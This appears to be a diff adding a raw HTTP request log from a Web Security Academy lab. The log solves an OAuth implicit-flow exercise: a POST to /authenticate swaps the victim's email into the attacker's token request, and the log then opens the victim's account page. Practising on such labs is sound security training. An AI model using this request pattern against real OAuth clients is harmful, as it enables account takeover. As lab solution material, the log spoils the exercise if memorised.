@@ -1,0 +1,28 @@
+GET /my-account HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+GET /social-login HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+GET /auth?client_id=wtvwazl30v82fa00ocsmr&redirect_uri=https://ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net/oauth-callback&response_type=token&nonce=1833248898&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-acc81fc01fb1b0cbc12e11120240005c.web-security-academy.net
+
+GET /oauth-callback HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+GET /me HTTP/1.1
+Host: oauth-acc81fc01fb1b0cbc12e11120240005c.web-security-academy.net
+
+POST /authenticate HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+{"email":"carlos@carlos-montoya.net","username":"wiener","token":"IRUfvfGY2mlZhrd9-f1ut5hy26mgmpI2s5oN974P4C1"}
+
+GET / HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+GET / HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
+
+GET /my-account?id=carlos HTTP/1.1
+Host: ac8c1fe61fe5b0a1c1c711da00b800c6.web-security-academy.net
